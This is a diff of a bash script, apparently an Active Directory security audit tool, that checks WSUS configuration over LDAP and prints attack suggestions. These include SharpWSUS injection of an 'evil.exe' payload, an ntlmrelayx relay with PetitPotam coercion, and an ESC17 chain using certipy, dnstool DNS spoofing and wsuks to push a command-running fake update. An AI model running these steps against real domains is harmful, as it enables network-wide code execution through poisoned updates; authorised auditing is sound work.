@@ -703,7 +703,7 @@ else
   echo -e "${GREEN}[OK] No hosts with WebClient (WebDAV) running${NC}"
 fi
 
-# WSUS Configuration Check
+# WSUS
 WSUS_URL=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(msSUS-SusServerUrl=*)" msSUS-SusServerUrl 2>/dev/null | grep "^msSUS-SusServerUrl:" | awk '{print $2}' | head -1)
 if [ -z "$WSUS_URL" ]; then
   echo -e "${GREY}[--] No WSUS server configured via GPO${NC}"
@@ -711,30 +711,34 @@ else
   if echo "$WSUS_URL" | grep -qi "^http://"; then
     WSUS_HOST=$(echo "$WSUS_URL" | sed 's|http://||i' | cut -d':' -f1 | cut -d'/' -f1)
     if [ ! -z "$COERCE_METHODS" ]; then
-      echo -e "${RED}[KO] WSUS via HTTP — NTLM Relay might be possible${NC}"
-      echo -e "${RED}       └─ $WSUS_URL${NC}"
+      echo -e "${RED}[KO] WSUS via HTTP — $WSUS_URL${NC}"
+      echo -e "${GREY}       └─ Update injection if WSUS admin: SharpWSUS.exe create /payload:evil.exe /args:/q /title:Update${NC}"
+      echo -e "${GREY}       └─ NTLM Relay might be possible${NC}"
       echo -e "${GREY}          1) ntlmrelayx.py -t http://$WSUS_HOST/iuident.cab --serve-image${NC}"
       echo -e "${GREY}          2) PetitPotam/PrinterBug → relay WSUS client auth → inject update${NC}"
     else
-      echo -e "${RED}[KO] WSUS via HTTP — NTLM Relay would be possible, but no coerce methods on DC${NC}"
-      echo -e "${GREY}       └─ $WSUS_URL${NC}"
+      echo -e "${RED}[KO] WSUS via HTTP — $WSUS_URL${NC}"
+      echo -e "${GREY}       └─ Update injection if WSUS admin: SharpWSUS.exe create /payload:evil.exe /args:/q /title:Update${NC}"
     fi
   elif echo "$WSUS_URL" | grep -qi "^https://"; then
-    WSUS_HOST=$(echo "$WSUS_URL" | sed 's|https://||i' | cut -d':' -f1 | cut -d'/' -f1)
-    WSUS_PORT=$(echo "$WSUS_URL" | sed 's|https://||i' | cut -d':' -f2 | cut -d'/' -f1)
-    echo -e "${GREEN}[OK] WSUS via HTTPS: $WSUS_URL${NC}"
+    WSUS_HOST=$(echo "$WSUS_URL" | sed 's|https://||i' | cut -d'/' -f1 | cut -d':' -f1)
+    WSUS_PORT=$(echo "$WSUS_URL" | grep -oP '(?<=:)\d+' | head -1)
+    [ -z "$WSUS_PORT" ] && WSUS_PORT="8531"
     CERTIPY_TXT=$(ls -t "$OUTPUT_DIR"/*_Certipy.txt 2>/dev/null | head -1)
     if [ ! -z "$CERTIPY_TXT" ]; then
-      WSUS_TEMPLATE=$(grep -A5 "Template Name" "$CERTIPY_TXT" | grep -i "wsus\|updatesrv\|update" | awk '{print $NF}' | head -1)
-      if [ ! -z "$WSUS_TEMPLATE" ]; then
-        echo -e "${RED}[KO] WSUS via HTTPS + ADCS template '$WSUS_TEMPLATE' found (ESC17)${NC}"
+      ESC17_FOUND=$(grep "ESC17" "$CERTIPY_TXT" | head -1)
+      WSUS_TEMPLATE=$(grep -B5 "ESC17" "$CERTIPY_TXT" | grep "Template Name" | awk '{print $NF}' | head -1)
+      if [ ! -z "$ESC17_FOUND" ]; then
+      echo -e "${RED}[KO] WSUS via HTTPS + ESC17 found ($WSUS_TEMPLATE on $WSUS_URL)${NC}"
         echo -e "${GREY}          1) certipy-ad req -u '$FULL_USER' -p '$PASSWORD' -ca <CA> -template $WSUS_TEMPLATE -dns $WSUS_HOST -dc-ip $DC_IP${NC}"
         echo -e "${GREY}          2) openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes${NC}"
         echo -e "${GREY}          3) dnstool.py -u '$DOMAIN\\$AD_USER' -p '$PASSWORD' -r $(echo $WSUS_HOST | cut -d'.' -f1) -a add -d <YOUR_IP> $DC_IP${NC}"
         echo -e "${GREY}          4) wsuks --serve-only -t $DC_IP -I tun0 --WSUS-Server $WSUS_HOST --WSUS-Port ${WSUS_PORT:-8531} --tls-cert wsus.pem -c '/accepteula /s cmd.exe /c <CMD>'${NC}"
       else
-        echo -e "${GREY}       └─ No WSUS-related ADCS template found${NC}"
+        echo -e "${GREEN}[OK] WSUS via HTTPS: $WSUS_URL${NC}"
       fi
+    else
+      echo -e "${GREY}[OK] WSUS via HTTPS: $WSUS_URL${NC}"
     fi
   fi
 fi
